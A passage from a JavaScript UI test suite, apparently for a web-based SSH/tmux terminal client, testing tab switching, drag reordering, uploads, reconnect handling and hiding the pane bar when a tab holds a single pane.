  const rs = resizesFor(env, 'sid-a.host', m2).map(e => e.body.cols + 'x' + e.body.rows);
  ok(rs.length === 1 && rs[0] === want.join('x'), 'exactly one /api/resize ' + want.join('x') + '; got ' + JSON.stringify(rs));
  cleanup(env);
});

test('tabs: closing the active pane of a split tab keeps that tab in front', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b1 = await tNewTab(win, 'b1.host');
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host');
  if (!b2) { ok(false, 'setup'); cleanup(env); return; }
  const tB = tabOfPane(b1);
  ok(win.activeId === b2.id, 'b2 active');
  win.closePane(b2.id);
  await until(() => !win.panes[b2.id], 500);
  ok(tabId(activeTab(win)) === tB, 'tab B stays in front');
  ok(win.activeId === b1.id && b1.term._focusCalls > 0, 'b1 becomes the active pane; got ' + win.activeId);
  ok(env.lay.hidden(a.el), 'A stays hidden');
  cleanup(env);
});

test('tabs: dragging a tab along the strip reorders it, and the order survives a reload', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  const c = await tNewTab(win, 'c.host');
  if (!b || !c) { ok(false, 'setup'); cleanup(env); return; }
  const order = w => tabEls(w).map(t => panesOfTab(w, tabId(t)).map(p => p.host).join('+')).join(',');
  ok(order(win) === 'a.host,b.host,c.host', 'start order; got ' + order(win));
  const mouse = (target, type, x, buttons) => target.dispatchEvent(new win.MouseEvent(type,
    {bubbles: true, cancelable: true, button: 0, buttons: buttons, clientX: x, clientY: 5}));
  // A plain click on C: no reorder.
  const cEl = tabElOfPane(win, c);
  mouse(cEl, 'mousedown', 500, 1); mouse(win.document, 'mouseup', 500, 0);
  mouse(cEl, 'click', 500, 0);
  ok(order(win) === 'a.host,b.host,c.host', 'a click does not reorder; got ' + order(win));
  // The layout model puts every tab at x=0..720: x=10 is left of all centres.
  mouse(cEl, 'mousedown', 500, 1);
  mouse(win.document, 'mousemove', 400, 1);
  mouse(win.document, 'mousemove', 10, 1);
  mouse(win.document, 'mouseup', 10, 0);
  ok(order(win) === 'c.host,a.host,b.host', 'C dragged to the front; got ' + order(win));
  ok(tabId(activeTab(win)) === tabOfPane(c) && win.activeId === c.id, 'C is still the active tab');
  ok(!cEl.classList.contains('dragging'), 'no drag state left on the tab');
  // A mouse move after the button is up is not a drag.
  mouse(win.document, 'mousemove', 700, 0);
  ok(order(win) === 'c.host,a.host,b.host', 'a move without the button does nothing');
  // The button released outside the window (no mouseup reaches the
  // page): the next move, with no button down, must not drag the tab.
  const aEl = tabElOfPane(win, a);
  mouse(aEl, 'mousedown', 500, 1);
  mouse(win.document, 'mousemove', 700, 0);
  mouse(win.document, 'mousemove', 10, 0);
  ok(order(win) === 'c.host,a.host,b.host', 'a lost mouseup leaves no drag behind; got ' + order(win));
  mouse(win.document, 'mouseup', 10, 0);
  await sleep(50);
  const snap = snapshotStorage(win);
  cleanup(env);
  const env2 = await mkTabEnv(TAB_PLAN(), snap); const w2 = env2.win;
  await until(() => paneList(w2).filter(p => p.sid).length === 3, 2000);
  ok(order(w2) === 'c.host,a.host,b.host', 'the new order survives a reload; got ' + order(w2));
  ok(activeTab(w2) && panesOfTab(w2, tabId(activeTab(w2)))[0].host === 'a.host', 'A (pressed last) active after reload');
  cleanup(env2);
});

test('tabs: a file dropped on a pane of a tab shown after a switch uploads into that pane', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  clickTab(win, tabElOfPane(win, a));
  await until(() => win.activeId === a.id, 500);
  clickTab(win, tabElOfPane(win, b));
  await until(() => win.activeId === b.id, 500);
  const started = [];
  const realStart = win.startUploadFiles;
  win.startUploadFiles = (id, files) => started.push([id, files.map(f => f.name)]);
  const item = {kind: 'file', getAsFile: () => ({name: 'x.txt', size: 3}), webkitGetAsEntry: () => ({isDirectory: false})};
  const drag = (target, type) => {
    const ev = new win.Event(type, {bubbles: true, cancelable: true});
    Object.defineProperty(ev, 'dataTransfer', {value: {types: ['Files'], items: [item], files: [item.getAsFile()], dropEffect: ''}});
    target.dispatchEvent(ev);
    return ev;
  };
  drag(b.el, 'dragenter');
  ok(b.el.classList.contains('drop-target'), 'the shown pane highlights');
  const ev = drag(b.el, 'drop');
  ok(ev.defaultPrevented, 'drop handled');
  ok(started.length === 1 && started[0][0] === b.id, 'upload goes to b, the pane it was dropped on; got ' + JSON.stringify(started));
  ok(tabId(activeTab(win)) === tabOfPane(b), 'still on B');
  // A tab drag is not a file drag: mouse-dragging a tab starts no upload.
  const t = tabElOfPane(win, a);
  t.dispatchEvent(new win.MouseEvent('mousedown', {bubbles: true, button: 0, buttons: 1, clientX: 300}));
  win.document.dispatchEvent(new win.MouseEvent('mousemove', {bubbles: true, buttons: 1, clientX: 10}));
  win.document.dispatchEvent(new win.MouseEvent('mouseup', {bubbles: true, clientX: 10}));
  ok(started.length === 1, 'a tab drag starts no upload');
  win.startUploadFiles = realStart;
  cleanup(env);
});

test('tabs: closing a tab whose pane is still connecting leaves nothing behind', async () => {
  // A reload with two tabs; B's reconnect is slow. The user closes B
  // with its x before the connect answers.
  const rec = h => ({label: 'u@' + h, via: 'manual', host: h, port: 22, user: 'u', auth: 'pw',
                     persistent: false, slot_id: null, tmux_cmd: 'tmux', cols: 80, rows: 24});
  const pre = {local: {websh_panes: JSON.stringify({version: 2,
    layout: {type: 'leaf', pane: 'p1'}, panes: {p1: rec('a.host')}})},
    session: {websh_panes_session: JSON.stringify({p1: {password: 'pw-a.host'}})}};
  // Build a two-tab manifest through the product itself: first boot from v2,
  // add a tab, then reload with B's connect slowed down.
  const env0 = await mkTabEnv(TAB_PLAN(), pre); const w0 = env0.win;
  await until(() => paneList(w0).some(p => p.sid), 2000);
  if (!needTabs(w0)) { cleanup(env0); return; }
  const b0 = await tNewTab(w0, 'b.host');
  if (!b0) { ok(false, 'setup'); cleanup(env0); return; }
  clickTab(w0, tabElOfPane(w0, paneList(w0).find(p => p.host === 'a.host')));
  await sleep(50);
  const snap = snapshotStorage(w0);
  cleanup(env0);
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'b.host', response: {session_id: 'sid-b-late', alive: true}, delay: 300},
  ]), snap);
  const win = env.win;
  await until(() => tabEls(win).length === 2 && paneList(win).some(p => p.host === 'a.host' && p.sid), 1500);
  const b = paneList(win).find(p => p.host === 'b.host');
  ok(!!b && !b.sid && b.connecting, 'B\'s pane is still connecting (setup)');
  if (!b) { cleanup(env); return; }
  ok(dotState(tabElOfPane(win, b)) === 's-wait', 'B\'s dot is amber while it connects; got ' + dotState(tabElOfPane(win, b)));
  closeTabX(win, tabElOfPane(win, b));
  await until(() => tabEls(win).length === 1, 500);
  ok(tabEls(win).length === 1, 'B closed');
  await until(() => disconnectsFor(env, 'sid-b-late').length > 0, 1000);
  ok(disconnectsFor(env, 'sid-b-late').length === 1, 'the session that arrived late is disconnected, once');
  await sleep(50);
  ok(tabEls(win).length === 1 && tabRoots(win).length === 1 && paneList(win).length === 1,
     'no tab, root or pane came back; got ' + tabEls(win).length + '/' + tabRoots(win).length + '/' + paneList(win).length);
  ok(win.activeId === paneList(win)[0].id && hidden($(win, 'ov')), 'A stays in front, no login form');
  const m = JSON.parse(win.localStorage.getItem('websh_panes'));
  ok(!/b\.host/.test(JSON.stringify(m)), 'B is gone from the saved manifest');
  cleanup(env);
});

test('tabs: + then the current tab closes while the form is open', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  // B in front; "+" opens the form; B goes away underneath it.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  win.closeTab(tabOfPane(b));
  await until(() => tabEls(win).length === 1, 500);
  ok(!hidden($(win, 'ov')), 'the form is still open');
  ok(tabId(activeTab(win)) === tabOfPane(a), 'A came forward');
  const c = await tConnect(win, 'c.host');
  ok(!!c && tabEls(win).length === 2 && tabOfPane(c) !== tabOfPane(a), 'the connect still makes a new tab');
  ok(tabId(activeTab(win)) === tabOfPane(c), 'and shows it');
  // Now the only tab left closes under an open + form: the form becomes
  // the initial one, and connecting makes exactly one tab.
  win.closeTab(tabOfPane(a));
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  win.closeTab(tabOfPane(c));
  await until(() => tabEls(win).length === 0, 500);
  ok(win.overlayMode === 'initial' && !hidden($(win, 'ov')), 'last tab gone: initial form; mode ' + win.overlayMode);
  const d = await tConnect(win, 'd.host');
  ok(!!d && tabEls(win).length === 1 && tabRoots(win).length === 1, 'one tab after connecting; got ' + tabEls(win).length);
  cleanup(env);
});

test('tabs: a reload where one tab\'s pane fails to log in keeps every tab', async () => {
  const env1 = await mkTabEnv(TAB_PLAN()); const w1 = env1.win;
  const a = await tConnect(w1, 'a.host');
  if (!needTabs(w1) || !a) { cleanup(env1); return; }
  const b = await tNewTab(w1, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env1); return; }
  clickTab(w1, tabElOfPane(w1, a));
  await sleep(50);
  const snap = snapshotStorage(w1);
  cleanup(env1);
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'b.host', response: {auth_failed: true, alive: false}},
  ]), snap);
  const win = env.win;
  await until(() => paneList(win).some(p => p.host === 'a.host' && p.sid) &&
                    env.log.some(e => e.action === 'connect' && e.body.host === 'b.host'), 1500);
  await sleep(100);
  const pb = paneList(win).find(p => p.host === 'b.host');
  ok(tabEls(win).length === 2 && !!pb, 'both tabs are still there; got ' + tabEls(win).length);
  ok(hidden($(win, 'ov')), 'no login form pops up');
  ok(!!pb && dotState(tabElOfPane(win, pb)) === 's-off', 'B\'s dot is red; got ' + (pb && dotState(tabElOfPane(win, pb))));
  ok(tabId(activeTab(win)) === tabOfPane(paneList(win).find(p => p.host === 'a.host')), 'A stays in front');
  const m = win.localStorage.getItem('websh_panes');
  ok(/b\.host/.test(m), 'B is kept in the saved manifest, to retry with a new password');
  cleanup(env);
});

test('tabs: rapid switching while both tabs stream output', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  win.flushPaneResize(a);
  await until(() => a.lastSentCols === 80, 500);
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  win.flushPaneResize(b);
  await until(() => b.lastSentCols === 80, 500);
  const mark = env.log.length;
  const got = {a: 0, b: 0};
  const wa = a.term.write, wb = b.term.write;
  a.term.write = d => { got.a += d.length; }; b.term.write = d => { got.b += d.length; };
  let n = 0;
  for (let i = 0; i < 60; i++) {
    win.handleOutputPayload(a, {data: b64(win, 'aaaaaaaaaa'), alive: true}, a.sid);
    win.handleOutputPayload(b, {data: b64(win, 'bbbbbbbbbb'), alive: true}, b.sid);
    n += 10;
    clickTab(win, tabElOfPane(win, i % 2 ? b : a));
    if (i % 7 === 0) await sleep(0);
  }
  // last click (i=59) was on b
  await sleep(300);
  ok(got.a === n && got.b === n, 'every byte reached both terminals; got ' + got.a + '/' + got.b + ' of ' + n);
  ok(tabId(activeTab(win)) === tabOfPane(b) && win.activeId === b.id, 'the last clicked tab is in front');
  ok(!env.lay.hidden(b.el) && env.lay.hidden(a.el), 'and only it is shown');
  ok(a.term.cols === 80 && b.term.cols === 80 && a.term.rows === 24 && b.term.rows === 24, 'sizes untouched');
  const rs = env.log.slice(mark).filter(e => e.action === 'resize');
  ok(rs.length === 0, 'no resize for a size that never changed; got ' + JSON.stringify(rs.map(e => e.body)));
  ok(!tabElOfPane(win, b).classList.contains('activity'), 'the tab in front carries no activity mark');
  a.term.write = wa; b.term.write = wb;
  cleanup(env);
});


test('tabs: a background reconnect while the + form is open does not hijack the new tab', async () => {
  const env = await mkTabEnv(TAB_PLAN()); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  // b in front; "+" opened; meanwhile a (hidden tab) loses its session
  // and reconnects by itself.
  press(win, $(win, 'tabNew'));
  await until(() => !hidden($(win, 'ov')), 1000);
  win.handleOutputPayload(a, {error: 'session not found'}, a.sid);
  await until(() => a.sid === 'sid-a.host' && !a.connecting, 1000);
  ok(a.sid === 'sid-a.host', 'a reconnected by itself');
  ok(!hidden($(win, 'ov')) && win.overlayMode === 'tab', 'the + form stays open; mode ' + win.overlayMode);
  ok(tabEls(win).length === 2 && tabOfPane(a) !== tabOfPane(b), 'no tab created or merged by the reconnect');
  ok(tabId(activeTab(win)) === tabOfPane(b), 'the reconnect did not bring its tab to the front');
  const c = await tConnect(win, 'c.host');
  ok(!!c && tabEls(win).length === 3 && panesOfTab(win, tabOfPane(c)).length === 1, 'the + connect makes its own tab');
  ok(panesOfTab(win, tabOfPane(a)).length === 1 && a.sid === 'sid-a.host', 'a keeps its tab and session');
  cleanup(env);
});

// =====================================================================
// Tabs (step 2): a lone pane has no bar of its own.
// Written from the behaviour spec, before the feature existed.
//
// DOM contract these tests rely on (the implementer provides it):
//   .pane > .pane-bar         hidden (.h, [hidden] or display:none, also
//                             through a class on an ancestor such as
//                             .tab-root.solo) while its tab has ONE pane;
//                             shown in a tab with 2+ panes
//   #paneTools                group in .top, after #tabNew and before
//                             .top-r; shown only when the active tab has
//                             exactly one pane, hidden otherwise (also
//                             when there is no tab: initial login form)
//   #paneTools [data-act=upload|download|split-h|split-v|close]
//                             buttons acting on the active pane;
//                             upload/download .disabled until it is
//                             connected and while a transfer runs
//   .upload-progress          (with .upload-progress-text and
//                             .upload-progress-cancel) a VISIBLE one for a
//                             lone pane's transfer - in #paneTools or as
//                             a card over the pane
//   .pane-tag.persistent / .pane-tag.ephemeral
//                             the marker stays visible for a lone pane
//                             (in the tab handle or #paneTools)
// The layout model gives the bar 2 rows: the bar shown, the terminal
// has 22 of the box's 24 rows; hidden, all 24.
// =====================================================================
const BAR = 2;
const S2 = {barRows: BAR};
const barOf = p => p && p.el && p.el.querySelector('.pane-bar');
const barShown = (env, p) => { const b = barOf(p); return !!b && !env.lay.hidden(b); };
const tools = win => $(win, 'paneTools');
const toolsShown = env => !!tools(env.win) && !env.lay.hidden(tools(env.win));
const toolBtn = (win, act) => { const g = tools(win); return g ? g.querySelector('[data-act="' + act + '"]') : null; };
const ACTS = ['upload', 'download', 'split-h', 'split-v', 'close'];
function needTools(win) {
  const g = !!tools(win);
  ok(g, 'top-bar pane actions present: #paneTools');
  return g;
}
const sizesSent = (env, sid, from) => resizesFor(env, sid, from).map(e => e.body.cols + 'x' + e.body.rows);
// The size the server last heard for a session: the connect, then every
// resize after it.
function serverSize(env, sid) {
  let s = null;
  env.log.forEach(e => {
    if (e.action === 'connect' && e.body && ('sid-' + (e.body.host || e.body.connection)) === sid && e.body.cols)
      s = e.body.cols + 'x' + e.body.rows;
    if (e.action === 'resize' && e.body && e.body.session_id === sid) s = e.body.cols + 'x' + e.body.rows;
  });
  return s;
}
// Settles the debounced resize of a pane so later counts start clean.
async function settled(win, p) {
  win.flushPaneResize(p);
  await until(() => p.lastSentCols === p.term.cols && p.lastSentRows === p.term.rows, 1000);
  await sleep(200);            // past the 150 ms resize debounce
}
function visibleAll(env, sel) {
  return Array.from(env.win.document.querySelectorAll(sel)).filter(e => !env.lay.hidden(e));
}
function fireChange(win, input) {
  const code = input.getAttribute && input.getAttribute('onchange');
  if (code) win.eval('(function(){' + code + '})').call(input);
  else input.dispatchEvent(new win.Event('change', {bubbles: true}));
}
// Records every <input> .click() (the file picker opening).
function pickerSpy(win) {
  const seen = [];
  const P = win.HTMLInputElement.prototype;
  const orig = P.click;
  P.click = function() { seen.push(this); };
  seen.restore = () => { P.click = orig; };
  return seen;
}
// XHR that reports some progress and then hangs until aborted.
function hangingXhr(win) {
  const st = {xhrs: []};
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; st.xhrs.push(this); }
    open(m, url) { this.url = url; }
    setRequestHeader() {}
    abort() { this.aborted = true; }
    send() { win.setTimeout(() => { if (!this.aborted && this.upload.onprogress) this.upload.onprogress({loaded: 400}); }, 2); }
  };
  return st;
}

test('solo: a lone pane has no bar; its terminal gets the height and the server that size', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const g0 = tools(win);
  ok(!g0 || env.lay.hidden(g0), 'no pane actions in the top bar while the initial login form is up');
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  ok(!barShown(env, a), 'the lone pane\'s .pane-bar is not shown');
  ok(a.term.cols === 80 && a.term.rows === 24,
     'the terminal has the whole box, 80x24 (22 rows would mean the bar still takes its place); got ' + a.term.cols + 'x' + a.term.rows);
  ok(serverSize(env, 'sid-a.host') === '80x24', 'the server has 80x24 for the PTY; got ' + serverSize(env, 'sid-a.host'));
  if (!needTools(win)) { cleanup(env); return; }
  ok(toolsShown(env), '#paneTools is shown with one pane in the tab');
  const top = win.document.querySelector('.top');
  const g = tools(win);
  const F = win.Node.DOCUMENT_POSITION_FOLLOWING;
  ok(top.contains(g), '#paneTools is in the top bar');
  ok(!!($(win, 'tabNew').compareDocumentPosition(g) & F) && !!(g.compareDocumentPosition(top.querySelector('.top-r')) & F),
     '#paneTools sits after the tab strip and "+" and before the global buttons (.top-r)');
  ACTS.forEach(act => {
    const btn = toolBtn(win, act);
    ok(!!btn && !env.lay.hidden(btn), 'top-bar button [data-act=' + act + '] is there and shown');
    const u = btn && btn.querySelector('svg.ic use');
    ok(!!u && /^#i-/.test(u.getAttribute('href') || ''), '[data-act=' + act + '] uses the icon sprite like the pane bar');
    ok(!!btn && !!btn.getAttribute('aria-label'), '[data-act=' + act + '] has an aria-label');
  });
  ok(toolBtn(win, 'upload') && !toolBtn(win, 'upload').disabled, 'upload is enabled for a connected pane');
  ok(toolBtn(win, 'download') && !toolBtn(win, 'download').disabled, 'download is enabled for a connected pane');
  ok(!!(toolBtn(win, 'upload') || {}).title && !!(toolBtn(win, 'close') || {}).title, 'the buttons carry tooltips');
  cleanup(env);
});

test('solo: a split brings the bars back and refits once; closing back to one pane hides it and refits once', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  needTools(win);
  await settled(win, a);
  ok(a.term.rows === 24 && !barShown(env, a), 'start: lone pane, no bar, 24 rows; got ' + a.term.rows);
  let mark = env.log.length;
  const b = await tSplit(win, a, 'h', 'b.host');
  if (!b) { ok(false, 'setup: split'); cleanup(env); return; }
  await until(() => a.term.rows === 24 - BAR, 1000);
  await sleep(300);
  ok(barShown(env, a) && barShown(env, b), 'with two panes both bars are shown');
  ok(!toolsShown(env), 'and the top-bar pane actions are hidden');
  ok(a.term.rows === 24 - BAR, 'the first pane gave the bar its rows: ' + (24 - BAR) + '; got ' + a.term.rows);
  let rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length === 1 && rs[0] === '80x' + (24 - BAR), 'exactly one /api/resize 80x' + (24 - BAR) + ' for the first pane; got ' + JSON.stringify(rs));
  ok(b.term.rows === 24 - BAR, 'the new pane, with its bar, has ' + (24 - BAR) + ' rows; got ' + b.term.rows);
  await settled(win, b);
  mark = env.log.length;
  win.closePane(b.id);
  await until(() => !win.panes[b.id], 500);
  await until(() => a.term.rows === 24, 1000);
  await sleep(300);
  ok(!barShown(env, a), 'one pane left: its bar is hidden again');
  ok(toolsShown(env), 'and the pane actions are back in the top bar');
  ok(a.term.rows === 24, 'the terminal gets the bar\'s rows back: 24; got ' + a.term.rows);
  rs = sizesSent(env, 'sid-a.host', mark);
  ok(rs.length === 1 && rs[0] === '80x24', 'exactly one /api/resize 80x24; got ' + JSON.stringify(rs));
  ok(env.log.filter(e => e.action === 'resize' && degenerate(e)).length === 0, 'no degenerate resize');
  cleanup(env);
});

test('solo: switching between a one-pane tab and a split tab flips bars and top-bar actions, with no resize', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  if (!needTabs(win) || !a1) { cleanup(env); return; }
  needTools(win);
  const a2 = await tSplit(win, a1, 'v', 'a2.host');
  const b = await tNewTab(win, 'b.host');
  if (!a2 || !b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b);
  await settled(win, b);
  ok(tabId(activeTab(win)) === tB, 'B (one pane) in front');
  ok(!barShown(env, b) && toolsShown(env), 'B: no pane bar, actions in the top bar');
  ok(b.term.rows === 24, 'B\'s terminal has 24 rows; got ' + b.term.rows);
  clickTab(win, tabById(win, tA));
  await until(() => tabId(activeTab(win)) === tA, 500);
  await until(() => !toolsShown(env), 500);
  ok(!toolsShown(env), 'A (two panes) in front: top-bar pane actions hidden');
  ok(barShown(env, a1) && barShown(env, a2), 'A: both panes show their bar');
  await settled(win, a1); await settled(win, a2);
  ok(a1.term.rows === 24 - BAR && a2.term.rows === 24 - BAR, 'A\'s terminals leave room for their bars; got ' + a1.term.rows + '/' + a2.term.rows);
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  await until(() => toolsShown(env), 500);
  ok(toolsShown(env) && !barShown(env, b), 'back on B: actions in the top bar, no pane bar');
  ok(b.term.rows === 24, 'B still 24 rows; got ' + b.term.rows);
  // Now everything is settled: switching back and forth sends nothing.
  await sleep(200);
  const mark = env.log.length;
  for (let i = 0; i < 3; i++) {
    clickTab(win, tabById(win, tA)); await until(() => tabId(activeTab(win)) === tA, 500);
    await sleep(20);
    clickTab(win, tabById(win, tB)); await until(() => tabId(activeTab(win)) === tB, 500);
    await sleep(20);
  }
  await sleep(300);
  const rs = env.log.slice(mark).filter(e => e.action === 'resize').map(e => e.body.session_id + ' ' + e.body.cols + 'x' + e.body.rows);
  ok(rs.length === 0, 'switching tabs (sizes unchanged) sends no /api/resize; got ' + JSON.stringify(rs));
  ok(toolsShown(env) && !barShown(env, b), 'ends on B with the right chrome');
  cleanup(env);
});

test('solo: the top-bar actions act on the active pane of the active tab', async () => {
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'ls', response: {path: '/home/u', entries: []}},
  ]), null, S2); const win = env.win;
  const urls = recordUrls(win);
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !needTools(win) || !a) { cleanup(env); return; }
  const b = await tNewTab(win, 'b.host', {persistent: true});
  if (!b) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a), tB = tabOfPane(b);
  ok(tabId(activeTab(win)) === tB && win.activeId === b.id, 'B in front');
  const esc = async () => {
    win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true, cancelable: true}));
    await until(() => hidden($(win, 'ov')), 500);
  };
  // Split horizontal / vertical: the login form for a split of b.
  press(win, toolBtn(win, 'split-h'));
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')), 'split-h opens the login form');
  ok(win.pendingSplit && win.pendingSplit.fromId === b.id && win.pendingSplit.dir === 'h',
     'for a horizontal split of the active pane; got ' + JSON.stringify(win.pendingSplit));
  await esc();
  press(win, toolBtn(win, 'split-v'));
  await until(() => !hidden($(win, 'ov')), 500);
  ok(win.pendingSplit && win.pendingSplit.fromId === b.id && win.pendingSplit.dir === 'v',
     'split-v: a vertical split of the active pane; got ' + JSON.stringify(win.pendingSplit));
  await esc();
  await until(() => toolsShown(env) && !barShown(env, b), 500);
  ok(panesOfTab(win, tB).length === 1 && !barShown(env, b) && toolsShown(env) && hidden($(win, 'ov')),
     'dismissed: B unchanged, still one pane without a bar; panes=' + panesOfTab(win, tB).length +
     ' bar=' + barShown(env, b) + ' tools=' + toolsShown(env) + ' form open=' + !hidden($(win, 'ov')));
  // Upload: the file picker opens, and what is picked goes to b.
  const st = hangingXhr(win);
  const picks = pickerSpy(win);
  press(win, toolBtn(win, 'upload'));
  picks.restore();
  const inp = picks.find(i => i.type === 'file');
  ok(!!inp, 'upload opens a file picker; inputs clicked: ' + picks.length);
  if (inp) {
    Object.defineProperty(inp, 'files', {value: [{name: 'top.txt', size: 4}], configurable: true});
    fireChange(win, inp);
    await until(() => st.xhrs.length > 0, 500);
    ok(st.xhrs.length === 1 && /session_id=sid-b\.host/.test(st.xhrs[0].url || ''),
       'the picked file uploads into b; got ' + JSON.stringify(st.xhrs.map(x => x.url)));
    ok(!a.upload, 'nothing goes to the pane in the hidden tab');
    if (b.upload) win.cancelTransfer(b.id);
    await until(() => !b.upload, 3000);
  }
  // Download: the file browser for b.
  await until(() => !toolBtn(win, 'download').disabled, 3000);
  press(win, toolBtn(win, 'download'));
  await until(() => !hidden($(win, 'fbOv')), 500);
  ok(!hidden($(win, 'fbOv')), 'download opens the file browser');
  ok(($(win, 'fbHost') || {}).textContent === 'u@b.host', 'on b\'s host; got ' + JSON.stringify(($(win, 'fbHost') || {}).textContent));
  await until(() => urls.some(u => /action=ls/.test(u)), 500);
  const ls = urls.filter(u => /action=ls/.test(u));
  ok(ls.length > 0 && ls.every(u => /session_id=sid-b\.host/.test(u)), 'the listing is for b\'s session; got ' + JSON.stringify(ls));
  win.document.dispatchEvent(new win.KeyboardEvent('keydown', {key: 'Escape', bubbles: true, cancelable: true}));
  await until(() => hidden($(win, 'fbOv')), 500);
  // Close on a live tmux pane: the same terminate question as the pane's own x.
  const modal = confirmCounter(win);
  press(win, toolBtn(win, 'close'));
  await until(() => modal.opened > 0, 500);
  ok(modal.opened === 1, 'close on a live tmux pane asks to terminate, once; got ' + modal.opened);
  win.confirmCancel();
  await sleep(30);
  ok(!!win.panes[b.id] && b.sid === 'sid-b.host', 'Cancel keeps it');
  press(win, toolBtn(win, 'close'));
  await until(() => modal.opened > 1, 500);
  win.confirmTerminate(false);
  await until(() => !win.panes[b.id], 500);
  const d = disconnectsFor(env, 'sid-b.host');
  ok(d.length === 1 && d[0].body.terminate === true, 'b terminated once; got ' + JSON.stringify(d.map(e => e.body)));
  ok(!tabById(win, tB) && tabId(activeTab(win)) === tA, 'its tab is gone and A is in front');
  ok(!!win.panes[a.id] && a.sid === 'sid-a.host', 'a untouched');
  // Close on a short-lived lone pane in the last tab: initial form.
  ok(toolsShown(env), 'A (one pane): actions in the top bar');
  press(win, toolBtn(win, 'close'));
  await until(() => !win.panes[a.id], 500);
  ok(!win.panes[a.id] && disconnectsFor(env, 'sid-a.host').length === 1, 'close closed a, no question');
  await until(() => !hidden($(win, 'ov')), 500);
  ok(!hidden($(win, 'ov')) && win.overlayMode === 'initial', 'last pane gone: the initial login form');
  await until(() => !toolsShown(env), 500);
  ok(!toolsShown(env), 'and no pane actions in the top bar');
  cleanup(env);
});

test('solo: top-bar upload/download are disabled until the pane is connected and while a transfer runs', async () => {
  // A pane exists without a session while it reconnects after a reload:
  // the connect below is held for 400 ms.
  const env0 = await mkTabEnv(TAB_PLAN(), null, S2);
  const a0 = await tConnect(env0.win, 'slow.host');
  if (!needTabs(env0.win) || !a0) { cleanup(env0); return; }
  const snap = snapshotStorage(env0.win);
  cleanup(env0);
  const env = await mkTabEnv(TAB_PLAN([
    {action: 'connect', match: b => b.host === 'slow.host', response: {session_id: 'sid-slow.host', alive: true}, delay: 400},
  ]), snap, S2); const win = env.win;
  if (!needTools(win)) { cleanup(env); return; }
  const pending = () => paneList(win).find(p => p.host === 'slow.host' && !p.sid);
  const seen = await until(() => !!pending() && win.activeId === pending().id && toolsShown(env), 350);
  if (seen) {
    ok(toolBtn(win, 'upload').disabled && toolBtn(win, 'download').disabled,
       'upload and download are disabled while the lone pane (re)connects');
  } else {
    ok(false, 'while the restored pane connects, it is active and #paneTools is shown');
  }
  await until(() => paneList(win).some(p => p.host === 'slow.host' && p.sid), 2000);
  const s = paneList(win).find(p => p.host === 'slow.host');
  await until(() => !toolBtn(win, 'upload').disabled, 500);
  ok(!toolBtn(win, 'upload').disabled && !toolBtn(win, 'download').disabled, 'enabled once connected');
  const a = await tNewTab(win, 'a.host');
  if (!a) { ok(false, 'setup: second tab'); cleanup(env); return; }
  clickTab(win, tabElOfPane(win, s));
  await until(() => win.activeId === s.id, 500);
  // A running transfer disables both, like the pane's own buttons.
  const st = hangingXhr(win);
  win.handleUpload(s.id, {files: [{name: 'x.bin', size: 5000}], value: ''});
  await until(() => toolBtn(win, 'upload').disabled, 500);
  ok(toolBtn(win, 'upload').disabled && toolBtn(win, 'download').disabled, 'disabled while an upload runs');
  // Switching to the idle tab: the buttons follow that tab's pane.
  clickTab(win, tabElOfPane(win, a));
  await until(() => win.activeId === a.id, 500);
  await until(() => !toolBtn(win, 'upload').disabled, 500);
  ok(!toolBtn(win, 'upload').disabled, 'in the other tab the buttons are for its (idle, connected) pane');
  clickTab(win, tabElOfPane(win, s));
  await until(() => win.activeId === s.id, 500);
  await until(() => toolBtn(win, 'upload').disabled, 500);
  ok(toolBtn(win, 'upload').disabled, 'back: disabled again (the upload is still running)');
  win.cancelTransfer(s.id);
  await until(() => !s.upload, 3000);
  await until(() => !toolBtn(win, 'upload').disabled, 500);
